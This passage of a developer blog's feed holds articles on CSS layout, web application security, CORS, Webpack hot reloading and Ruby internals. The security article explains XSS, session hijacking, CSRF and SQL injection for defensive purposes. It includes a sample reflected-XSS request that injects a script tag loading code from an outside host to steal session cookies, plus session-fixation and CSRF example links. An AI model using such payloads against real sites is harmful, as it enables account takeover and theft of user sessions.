&lt;p&gt;Then, all you need to do is simply add that class to all the elements that you want clearfixed.&lt;/p&gt;

&lt;h2 id=&quot;block-formatting-contexts&quot;&gt;Block Formatting Contexts&lt;/h2&gt;
&lt;p&gt;An element generates a block formatting context if it is:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;the root element or something that contains it&lt;/li&gt;
  &lt;li&gt;floats (elements where float is not none)&lt;/li&gt;
  &lt;li&gt;absolutely positioned elements (elements where position is absolute or fixed)&lt;/li&gt;
  &lt;li&gt;an inline-block (elements with display: inline-block)&lt;/li&gt;
  &lt;li&gt;a table cell (elements with display: table-cell, which is the default for HTML table cells)&lt;/li&gt;
  &lt;li&gt;a table caption (elements with display: table-caption, which is the default for HTML table captions)&lt;/li&gt;
  &lt;li&gt;a block element where overflow has a value other than visible&lt;/li&gt;
  &lt;li&gt;an element with display: flow-root&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;When dealing with blocks, it’s important to know how they affect their children. One such effect is the margin collapsing. Another effect is that block size affects the size of its children. By default, a div will expand to fill its parent container vertically, but there’s a gotcha:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/width-auto.png&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This by default makes just the content to be 100%.&lt;/p&gt;

&lt;h2 id=&quot;vertical-centering&quot;&gt;Vertical Centering&lt;/h2&gt;
&lt;p&gt;Something as simple as centering something in the middle of a container was problematic before the addition of flexbox. It still is for older browsers which don’t fully support the &lt;em&gt;display: flex&lt;/em&gt; CSS specification. Before we get into the quirky cases, let’s see how we solve vertical centering with flexbox:&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/0ed3a4426693a015ce6327bd30102502.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;If you know the height of the panel you want to center you can do something like:&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/49ae5ad134c24a4801965bd9516941c0.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;If your browser doesn’t support &lt;em&gt;calc&lt;/em&gt;, there are other ways to do it such as using line-height (which works only for text) or using &lt;em&gt;display: table-cell&lt;/em&gt;. Obviously, these are a bit hackish.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;Yes, HTML behaves quite unexpectedly if you are coming from something like WPF. As long as you are aware of some of the gotchas of the spec and the differences between browser implementations, developing in it is actually quite pleasurable.&lt;/p&gt;</content><author><name></name></author><summary type="html">If you have worked with another layout engine other than HTML, you probably think that HTML is really hacky and unpredictable. And you wouldn’t be mistaken to think that: sometimes things expand to fill the available spaces, sometimes they don’t. Sometimes you specify a margin and it is respected. Sometimes it’s not. Most developers would feel your pain, but here’s the thing:</summary></entry><entry><title type="html">Understanding Web Application Security</title><link href="http://localhost:4000/web-security" rel="alternate" type="text/html" title="Understanding Web Application Security" /><published>2017-09-13T09:39:37+03:00</published><updated>2017-09-13T09:39:37+03:00</updated><id>http://localhost:4000/web-security</id><content type="html" xml:base="http://localhost:4000/web-security">&lt;p&gt;I can testify that a lot of people confided in me they considered doing this (including yours truly) under the frustration of the bi-monthly administrative policies that mandated we change our workstation password:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/my-password.jpg&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This sort of thing happens more than you would imagine—what a lot of people don’t know is that hackers rely a lot on &lt;em&gt;social engineering&lt;/em&gt; to gain access to systems. &lt;a href=&quot;https://en.wikipedia.org/wiki/Kevin_Mitnick&quot;&gt;Kevin Mitnick&lt;/a&gt; was famous for calling in, pretending to be somebody he wasn’t and asking for somebody’s password in order to “perform some maintenance”.&lt;/p&gt;

&lt;h2 id=&quot;phishing&quot;&gt;Phishing&lt;/h2&gt;
&lt;p&gt;If you’ve followed the US 2016 election cycle news, you might have heard that John Podesta, Hillary Clinton’s campaign manager, was hacked. He was actually the victim of a &lt;em&gt;phishing&lt;/em&gt; scam whereby he received an email made to look like an authentic email from Google (he was using Gmail) that informed him that he needed to change his password because unauthorized access to his account was detected. He fell for it, clicked on the link which redirected him to a page that looked like a Google page (he didn’t pay attention to the URL, it seems), where he entered his old and &lt;em&gt;supposedly&lt;/em&gt; new credentials.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;But this is a scam, it’s not what I wanted to talk about, because you as a developer cannot do anything about it. I actually want to talk about real  vulnerabilities in the software and how they can be addressed, which means understanding the vectors attackers have at their disposal.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;There are quite a lot of developers that when it comes to web application security they rely on whatever framework they are using to take care of that for them, but don’t really have an understanding of what’s happening behind the scenes. Web application security is quite a complex topic, we will be covering:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Cross-site scripting, also called XSS&lt;/li&gt;
  &lt;li&gt;Session hijacking&lt;/li&gt;
  &lt;li&gt;Cross-site request forgery, or CSRF&lt;/li&gt;
  &lt;li&gt;SQL injection&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Both XSS and SQL Injection are cases of &lt;em&gt;code injection&lt;/em&gt;.&lt;/p&gt;

&lt;h2 id=&quot;cross-site-scripting&quot;&gt;Cross-Site Scripting&lt;/h2&gt;
&lt;p&gt;XSS refers to a vulnerability where an attacker is able to “inject” Javascript code that will be run by the application. In my previous article, I’ve discussed the &lt;a href=&quot;http://achiral.io/cors-made-simple&quot;&gt;same-origin&lt;/a&gt; policy concept at length which states that if content from one site is granted permission to access resources on a system, then any content from that site will share these permissions, while content from another site will have to be granted permissions separately.&lt;/p&gt;

&lt;p&gt;&lt;i&gt;A lot of people think that SOP prevents XSS attacks. This is &lt;b&gt;not the case.&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;

&lt;p&gt;A typical example of XSS is &lt;em&gt;persistent cross-site scripting&lt;/em&gt;. If a page isn’t properly &lt;em&gt;sanitizing&lt;/em&gt; the user input (a field in a for, for example), a user could actually type in valid Javascript code, which is going to be saved by the application in its database and be subsequently rendered every time it displays a page. Imagine you have a page that is visible to multiple users (such as a product page) which allows for users to add comments. If the page is not escaping user input, it is possible for a malicious user to write actual an script block, which will then be rendered to all users as part of the page HTML. The Javascript code has access to the cookies of that user and it can send that information to the a attacker.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/attack.png&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;An alternative is the &lt;em&gt;reflected&lt;/em&gt; (or non-persistent) XSS attack, whereby the user’s input is not stored in the database, but returned back in the same way it was inputted. It works like this: say you have a page that allows you to search for products. The user types some text in the search box and clicks the search button which sends a GET request to the server.&lt;/p&gt;

&lt;pre&gt;
GET http://www.onlineshop.com?search=something
&lt;/pre&gt;

&lt;p&gt;If the site finds something, it returns a list of results, but if it doesn’t, it’s going to say&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Your search, ‘something’, returned no results.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;…which is just the original, unaltered string. A crafty attacker might see this vulnerability and might send an email to the user asking him to click on a link which for the search term in the query string, contains some nefarious script block. If the user clicks on the link (which is likely because most people don’t hover on links to see where they lead to), the application server won’t be able to find any result, and will return with a &lt;em&gt;not found&lt;/em&gt; page containing the script rendered directly on the page.&lt;/p&gt;

&lt;pre&gt;
GET http://www.onlineshop.com?
  search=%3Cscript%2520src%3D%22http%3A%2F%2Fsomesite.com%2Fscript.js%22%3E%3C%2Fscript%3E
  HTTP/1.1
&lt;/pre&gt;

&lt;p&gt;This script can then hijack the session cookie, like in the previous example.&lt;/p&gt;

&lt;p&gt;What can we do about it? Actually two things:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Validate inputs: this means checking that the user didn’t try to input any funky stuff and warning him if this is the case.&lt;/li&gt;
  &lt;li&gt;Sanitize outputs: everything that’s rendered to the page must be HTML escaped. This means that script blocks will be displayed as text, and won’t be part of the DOM, and thus executed.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;If you are developing with Node / Express, there are plenty of packages to help you safeguard against XSS attacks, such as &lt;a href=&quot;https://www.npmjs.com/package/helmet&quot;&gt;helmet&lt;/a&gt; or &lt;a href=&quot;https://www.npmjs.com/package/xssfilter&quot;&gt;xssfilter&lt;/a&gt; etc.&lt;/p&gt;

&lt;h2 id=&quot;session-hijacking&quot;&gt;Session Hijacking&lt;/h2&gt;
&lt;p&gt;Most web applications use a session mechanism which allows the server hosting the web application to know which user is making a specific request. Sessions usually involve authenticating the user, creating some sort of &lt;em&gt;session_id&lt;/em&gt; (usually a string) and setting a cookie with that value on the user’s browser. Session hijacking is a way of getting to know that string.&lt;/p&gt;

&lt;p&gt;One way to gain access to it is, as I mentioned, cross-site scripting. Another typical way of gaining access to that cookie is by sniffing packets. Since browsers send the cookies associated with a domain for every request, somebody sniffing traffic would be able to see also the value of the session cookie. A typical way to sniff traffic is to set up an unencrypted Wi-Fi hotspot in a public place, and monitor the traffic of the people connecting to it. Does this mean I cannot use my online banking when I am connected to a public hotspot? No, because if the website uses SSL for all requests, the contents of the traffic won’t be intelligible to a man-in-the-middle, and usually major sites like Facebook / Twitter, online banking etc. are pretty well secured. There are however plenty of smaller poorly written sites that only use SSL for the login page, and then pass the session cookie unencrypted to other pages.&lt;/p&gt;

&lt;p&gt;Another way to gain access to a user’s session is to get that user to install a malware on his/hers computer. Since browsers usually store cookies on disk, that malware would be able to access the cookie if it knows where to look for it.&lt;/p&gt;

&lt;p&gt;A yet another way of accomplishing session hijacking is &lt;em&gt;session fixation&lt;/em&gt;. There are plenty of sites that accept a session ID in the URL, such as:&lt;/p&gt;

&lt;pre&gt;
http://www.website.com?sid=asb1sadasdasdan23123
&lt;/pre&gt;

&lt;p&gt;The reason why they do it is because a lot of users turn of their cookies, ironically, for security reasons. This however would open them up to scams, like somebody sending them an email which says:&lt;/p&gt;

&lt;blockquote&gt;
Hey, click on http://www.website.com?sid=asb1sadasdasdan23123, and enter credit card and address information to receive a free bonus on your order.
&lt;/blockquote&gt;

&lt;p&gt;Since the attacker knows the session id, he/she can also log to that page and see the information inputted by the user.&lt;/p&gt;

&lt;h2 id=&quot;cross-site-request-forgery&quot;&gt;Cross-Site Request Forgery&lt;/h2&gt;
&lt;p&gt;CSRF is an attack that tricks the victim into submitting a malicious request, and relies on the fact that the user is logged in. Since the browser usually sends the session cookie with the request, the server perceives the request as legitimate. An important part of CSRF attacks is &lt;em&gt;social engineering&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/csfr.png&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s say a site exposes some functionality in the form of a web request, like so:&lt;/p&gt;

&lt;pre&gt;
GET https://www.thesite.com/account?password=val HTTP/1.1
&lt;/pre&gt;

&lt;p&gt;This example is a bit contrived and oversimplified, but you get the picture. If the attacker can get the user to click on a link which points to that link &lt;strong&gt;while logged in&lt;/strong&gt;, that’s going to have the effect of changing the password for the user to whatever the attacker wants. This link can be part of an email, or it can be part of a message on a public board or a website set up by the attacker etc.&lt;/p&gt;

&lt;p&gt;An action that changes the password will more likely be a POST than a GET, but that doesn’t make it CSRF-proof either, because a user can be tricked into submitting a form. Here’s how that would work: you could have a form with a hidden input like so:&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/6862d6a60d2dc4418a38fd81ae69e5bd.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;Using HTML forms with email is not really possible, because a lot of clients disable them or warn about them, but you could redirect the user to a page hosted somewhere. It turns out you don’t even have to trick him/her to click on the submit button, that can be done by the site using Javascript (say by reacting to the document load event).&lt;/p&gt;

&lt;p&gt;How about PUT and DELETE? Turns out that the &lt;em&gt;same-origin policy&lt;/em&gt; helps us here, because attackers cannot do XHR requests from their site to the &lt;em&gt;http://www.thesite.com&lt;/em&gt;. It’s also why for POST attacks a form is being used instead of an POST XHR. SOP blocks that too.&lt;/p&gt;

&lt;h2 id=&quot;sql-injection&quot;&gt;SQL Injection&lt;/h2&gt;
&lt;p&gt;And last (in our article), but certainly not least, we have SQL injection. I think most of us remember this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/exploit.png&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;For SQL injection to work, you’d have to be writing your SQL queries using string interpolation / concatenation.&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/e842b81f3e4d1fef85087134717a1571.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;As you can see, the text fits nicely in the query. The way you get around this is by using parameters, which are supported by all database systems.&lt;/p&gt;</content><author><name></name></author><summary type="html">I can testify that a lot of people confided in me they considered doing this (including yours truly) under the frustration of the bi-monthly administrative policies that mandated we change our workstation password:</summary></entry><entry><title type="html">CORS Made Simple</title><link href="http://localhost:4000/cors-made-simple" rel="alternate" type="text/html" title="CORS Made Simple" /><published>2017-09-09T06:39:37+03:00</published><updated>2017-09-09T06:39:37+03:00</updated><id>http://localhost:4000/cors-made-simple</id><content type="html" xml:base="http://localhost:4000/cors-made-simple">&lt;p&gt;CORS stands for &lt;em&gt;Cross-Origin Resource Sharing&lt;/em&gt; and if you’ve built rich client applications that communicate with an API via REST, you have probably crossed paths with something known as &lt;em&gt;same-origin policy&lt;/em&gt;. What this policy refers to is that an application cannot access resources via &lt;a href=&quot;https://www.w3schools.com/xml/xml_http.asp&quot;&gt;XMLHttpRequest&lt;/a&gt; or the &lt;a href=&quot;https://developers.google.com/web/updates/2015/03/introduction-to-fetch&quot;&gt;Fetch API&lt;/a&gt; that come from a different URL than where the page was originally served from.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/cors.png&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is a restriction implemented on the browser level—if you load a page that contains Javascript that is attempting to do an XHR request, you are are going to get an error. CORS is a mechanism to bypass this restriction. It allows the server to “accept” calls incoming from a different origin. The reason I am using quotes is because, as previously mentioned, it’s actually the browser that implements the restriction, but the server has the option of specifying several headers in the response that will make the browser accept the response.&lt;/p&gt;

&lt;h2 id=&quot;specifics&quot;&gt;Specifics&lt;/h2&gt;
&lt;p&gt;OK, so let’s get into specifics: first let’s see what exactly constitutes the same origin and what is a different origin. The policy looks at the protocol (http or https), port number and host URL. Let’s assume that our page is served from &lt;em&gt;http://domain1.page.com/index.html&lt;/em&gt;. Accessing the following URLs will give the following results:&lt;/p&gt;

&lt;pre&gt;
http://domain1.page.com/items/3213
# Success.

https://domain1.page.com/items/12
# This fails because it's using https instead of http.

http://somethingelse.com/
# Fails because it's a totally different domain.

http://domain2.page.com/items/32
# Fails because the subdomain is different

http://domain1.page.com:9000/items/32
# Fails because the port is different.
&lt;/pre&gt;

&lt;p&gt;Of course, if you ever built applications using a microservice architecture, you know that sometimes it’s desirable to allow access to the backend for applications that will be hosted elsewhere, but you don’t necessarily want to open access to everybody. So CORS is sort of a middle-road between the two and it comes in handy when your applications are distributed because sometimes you just want to hook up things without configuring proxies and whatnot.&lt;/p&gt;

&lt;blockquote&gt;
We first must make the distinction between &lt;b&gt;simple requests&lt;/b&gt; and &lt;b&gt;preflighted requests&lt;/b&gt;.
&lt;/blockquote&gt;

&lt;p&gt;A simple request is a GET, POST or HEAD that meets a few conditions:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;No event listeners are registered on any &lt;em&gt;XMLHttpRequestUpload&lt;/em&gt; object used in the request and no &lt;em&gt;ReadableStream&lt;/em&gt; object is used in the request.&lt;/li&gt;
  &lt;li&gt;The only accepted headers are “CORS”: &lt;em&gt;Accept, Accept-Language, Content-Language, Content-Type, Last-Event-ID, DPR, Downlink, Save-Data, Viewport-Width&lt;/em&gt; and &lt;em&gt;Width&lt;/em&gt;.&lt;/li&gt;
  &lt;li&gt;The accepted values for the Content header are: &lt;em&gt;application/x-www-form-urlencoded, multipart/form-data&lt;/em&gt; and &lt;em&gt;text/plain&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If the server supports CORS, it will return a response specifying a value for the &lt;em&gt;Access-Control-Allow-Origin&lt;/em&gt; header:&lt;/p&gt;

&lt;pre&gt;
Access-Control-Allow-Origin: *
# this allows access from any origin

Access-Control-Allow-Origin: http://domain2.page.com
# allows access from domain2.page.com

# etc.
&lt;/pre&gt;

&lt;p&gt;A &lt;em&gt;preflighted request&lt;/em&gt; is one that &lt;strong&gt;automatically&lt;/strong&gt; triggers an OPTIONS call to the server before the actual request. It looks like this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/cors_flow.png&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;If any of the conditions for the request to be a simple request is violated, then we have a preflighted request on our hand. Which means that if we want to support CORS, our server needs to be able to respond to OPTIONS requests accordingly.&lt;/p&gt;

&lt;p&gt;This means we need something like:&lt;/p&gt;

&lt;pre&gt;
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: http://page.com
Access-Control-Allow-Methods: POST, GET, OPTIONS
Access-Control-Allow-Headers: Content-Type
&lt;/pre&gt;

&lt;p&gt;…in order to tell the browser it’s actually OK to send the real request.&lt;/p&gt;

&lt;p&gt;The whole concept of a “preflight request” seems a bit strange and you might be wondering why it was included in the spec. Couldn’t all requests be made without a preflight? A key concept to understand is that the role of the OPTIONS request doesn’t have to do with security.&lt;/p&gt;

&lt;blockquote&gt;
Preflight requests have the role of preserving the semantics of the web before CORS.
&lt;/blockquote&gt;

&lt;p&gt;In most previous applications (before REST and client side applications became popular) involved GETs for retrieving webpages, and POSTs for posting back form data. Old webserver which are CORS agnostic would never expect to receive a cross-domain DELETE request, and might behave unexpectedly in such cases. The preflight request is a way around this potential issue – it allows to actually query the backend and see if it supports CORS in a safe manner. You might have noticed that the allowed verbs are the ones that read and create data but NOT the ones that can modify existing information – like DELETE and PUT. Now you might be wondering: &lt;em&gt;couldn’t somebody just send a DELETE request via a tool like Postman, since CORS is implemented on the browser level?&lt;/em&gt; Sure, but that wouldn’t be a problem because backend services usually require authentication that would be stored locally in the form of a cookie and would be accessible to Javascript running in the browser but not to somebody doing a request using Postman.&lt;/p&gt;

&lt;h2 id=&quot;in-closing&quot;&gt;In Closing&lt;/h2&gt;
&lt;p&gt;Of course, you probably don’t want to be doing all that yourself, which is why there are libraries for supporting CORS in most platforms. If you’re using Node, it’s very simple to support CORS by using the &lt;a href=&quot;https://www.npmjs.com/package/cors&quot;&gt;cors library&lt;/a&gt; which is just simple Express middleware.&lt;/p&gt;

&lt;pre&gt;
npm install cors --save
&lt;/pre&gt;

&lt;p&gt;Using it is also very simple, it just needs to be registered as a middleware with Express.&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/de8610422124cce393883120e77e150b.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;Configuring Rails to use CORS is equally easy.&lt;/p&gt;</content><author><name></name></author><summary type="html">CORS stands for Cross-Origin Resource Sharing and if you’ve built rich client applications that communicate with an API via REST, you have probably crossed paths with something known as same-origin policy. What this policy refers to is that an application cannot access resources via XMLHttpRequest or the Fetch API that come from a different URL than where the page was originally served from.</summary></entry><entry><title type="html">Hot Module Reloading With Wepack, React And Babel</title><link href="http://localhost:4000/react-hmr" rel="alternate" type="text/html" title="Hot Module Reloading With Wepack, React And Babel" /><published>2017-09-07T06:39:37+03:00</published><updated>2017-09-07T06:39:37+03:00</updated><id>http://localhost:4000/react-hmr</id><content type="html" xml:base="http://localhost:4000/react-hmr">&lt;p&gt;Here’s what most people that worked with Webpack would agree: setting it up is not exactly a walk in the park, especially if you are trying to do multiple things at once like transpiling from ES6, using hot reloading and proxying your backend. But that’s what I am trying to change with this article.&lt;/p&gt;

&lt;p&gt;We are going to use the application we built in the &lt;a href=&quot;http://achiral.io/ruby-object-model&quot;&gt;previous article&lt;/a&gt; and add HMR to it. First of all, in order to use Hot Module Reloading in Webpack we must use the Webpack Dev Server which is essentially a Node / Express wrapper. Second, the HMR module doesn’t do a whole lot unless we are able to take advantage of it, and this is where the React HMR module comes in. Third, because we want to use ES6, we’ll be using the &lt;em&gt;babel-es2015-preset&lt;/em&gt; and we will be configuring a &lt;a href=&quot;https://webpack.js.org/concepts/#loaders&quot;&gt;loader&lt;/a&gt; for Webpack. Also we are going to use Babel to transpile the .jsx syntax.&lt;/p&gt;

&lt;blockquote&gt;
Webpack at its core is just a module bundler. It essentially detects dependencies between the building blocks of your application (like code files, style files etc.) and creates a bundle out of everything.
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/images/schematic.png&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It doesn’t actually do things like transpilation — if you have Coffee-script code, Typescript or ES6 code, you will have to use a loader. We will be using &lt;em&gt;babel-loader&lt;/em&gt; to compile our ES6/jsx code and feed it into Webpack.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
&lt;img src=&quot;/images/webpack-schematic.png&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;On the other side of the chain there are &lt;a href=&quot;https://webpack.js.org/concepts/#plugins&quot;&gt;plugins&lt;/a&gt; like uglifyJS (which we’re not using in the code sample, but I’ve added it in the drawing as an example of a plugin), which is a Javascript minifier. Another plugin example is &lt;em&gt;webpack-dev-server&lt;/em&gt; which we will be using to implement hot reloading.&lt;/p&gt;

&lt;h2 id=&quot;lets-jump-right-in&quot;&gt;Let’s Jump Right In&lt;/h2&gt;
&lt;p&gt;The dependencies section of the &lt;em&gt;package.json&lt;/em&gt; file look like this:&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/a7470f4ca4cadea9e8bc86573ecc4215.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;Our &lt;em&gt;.babelrc&lt;/em&gt; file looks like this:&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/f2264a5abc5f1ee8904ff6b93aa18feb.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;And finally, let’s have a look at the Webpack configuration page.&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/cff7cfbc3619a8115c880a22c8530697.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h2 id=&quot;adding-hot-reloading&quot;&gt;Adding Hot Reloading&lt;/h2&gt;
&lt;p&gt;Webpack Hot Module Replacement works by adding a small runtime to the generated bundle (which is going to run alongside your app) that constantly communicates with the server and if part of the dependency tree changes, it will inject the new dependencies. However, in order for this process to take place, we need to setup the Webpack Development Server, which means we need to add the following lines of code in the &lt;em&gt;webpack.config.js&lt;/em&gt; file in the configuration object.&lt;/p&gt;

&lt;pre&gt;
plugins: [
  new webpack.HotModuleReplacementPlugin()
],
devServer: {  
  proxy: {
    '*': 'http://localhost:3000'
  },
  hot: true,
  contentBase: './src/static',
  port: 9000   
}
&lt;/pre&gt;

&lt;p&gt;Second, we actually need React to &lt;strong&gt;do something&lt;/strong&gt; when the bundle changes, which is where the &lt;em&gt;react-hot-loader&lt;/em&gt; package comes into play. A module can only be updated if you “accept” it. So you need to &lt;em&gt;module.hot.accept()&lt;/em&gt; the module in the parents or the parents of the parents.&lt;/p&gt;

&lt;p&gt;Have a look at the following code:&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/d4d9e62d2b36d768bbefc78c7c084817.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;You can find the source code &lt;a href=&quot;https://github.com/toaderflorin/react-hmr&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><summary type="html">Here’s what most people that worked with Webpack would agree: setting it up is not exactly a walk in the park, especially if you are trying to do multiple things at once like transpiling from ES6, using hot reloading and proxying your backend. But that’s what I am trying to change with this article.</summary></entry><entry><title type="html">The Ruby Object Model And Metaprogramming</title><link href="http://localhost:4000/ruby-object-model" rel="alternate" type="text/html" title="The Ruby Object Model And Metaprogramming" /><published>2017-09-04T06:39:37+03:00</published><updated>2017-09-04T06:39:37+03:00</updated><id>http://localhost:4000/ruby-object-model</id><content type="html" xml:base="http://localhost:4000/ruby-object-model">&lt;p&gt;First things first: Ruby is a dynamic language but it’s not dynamic in the same way Javascript is a dynamic language. You actually have real classes and class inheritance and not just prototypical inheritance. Also Ruby is truly object oriented—everything is an object, even classes, and there is no such thing as a distinction between value and reference types. In this article we will be looking at MRI (Matz’s Ruby Implementation) which is written in C to see how everything works behind the scenes. At MRI’s core there are two structures that describe the current list of objects in memory: &lt;em&gt;RObject&lt;/em&gt; and &lt;em&gt;RClass&lt;/em&gt;. The C code is a little bit complicated so I will present a simplified schematic version, which will allow you to understand the implementation.&lt;/p&gt;

&lt;p&gt;At MRI’s core there are two structures that describe the current list of objects in memory: &lt;em&gt;RObject&lt;/em&gt; and &lt;em&gt;RClass&lt;/em&gt;. The C code is a little bit complicated so I will present a simplified schematic version, which will allow you to understand the implementation. Both structs inherit from another structure called &lt;em&gt;RBasic&lt;/em&gt;. Here’s a simplified version of the internal representation of these objects (again, the real code is a bit more complicated):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/ruby-objs.png&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;You might have noticed a few things:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;Classes are also objects, like previously mentioned.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Each object contains a collection of property values, just like Javascript objects.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Unlike Javascript however, the methods are not implemented on the object level but rather at the class level — an object refers to a class, thus gaining access to the methods.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;The RClass struct has a &lt;em&gt;super&lt;/em&gt; field which points to another &lt;em&gt;class instance object&lt;/em&gt; which is the base class of the respective class.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;As a side note, because a class is an object you can do something like:&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/f88f4c6bced8898f353006d16a4e7c60.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;The &lt;em&gt;Class.new&lt;/em&gt; method accepts a block in which we define the class methods.&lt;/p&gt;

&lt;p&gt;As you can see, Ruby’s dynamic nature translates into a very potent meta-programming ability. How much meta-programming you want to do and still have a fairly maintainable application is up for debate (and the subject of another article) however. For the time being, let’s look at how singleton methods / eigenclasses are implemented internally in the MRI.&lt;/p&gt;

&lt;h2 id=&quot;singleton-methods-and-eigenclasses&quot;&gt;Singleton Methods And Eigenclasses&lt;/h2&gt;

&lt;p&gt;You can also do something like:&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/dee2afd92c2a3f7fa8809858f9ea174d.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;…which defines a String instance and adds a method &lt;strong&gt;only&lt;/strong&gt; to this instance.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;But hold up, we discussed that we can only define methods on classes and those classes will be inherited by the object.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;That’s correct. So what happens here is Ruby creates an &lt;em&gt;eigenclass&lt;/em&gt; specifically for this object (which means “own class”—”eigen” means &lt;em&gt;own&lt;/em&gt; or &lt;em&gt;self&lt;/em&gt; in German). This class in our case is a child class of String. But we can go further—since you can add a method to any object, you can also add methods to class objects which turns out to be the closest thing Ruby has to static methods.&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/ccbb0a2f5b1da6f580c38459f1203f27.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;Let’s look at the following class definition:&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/e784cd304b404c14916a64a851c1a7ab.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;And last but not least, you can also add methods to a class like this:&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/dede663e10f66dea16e67739ed73d38a.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;As you can see, Ruby is quite unique in that it’s dynamic, but it’s still class based (as opposed to objects being just property bags like in Javascript) and it’s quite peculiar in the way it’s implemented. And all these dynamic features makes it easy for us to do…&lt;/p&gt;

&lt;h2 id=&quot;metaprogramming&quot;&gt;Metaprogramming&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;Metaprogramming&lt;/em&gt; is a rather loosely defined term, but the core concept is that the program is able to modify itself or generate new code on the fly. A very simple example of metaprogramming is defining accessors for properties in a class.&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/668c759648ac89371bb173e5eb0d3708.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;You don’t see that very often in practice however, what you do see is:&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/f72919ec8880ce84feded448e3f38360.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;&lt;em&gt;attr_accessor&lt;/em&gt; is a method defined of the &lt;em&gt;Object&lt;/em&gt; class from which all Ruby classes inherit. It looks something like this:&lt;/p&gt;

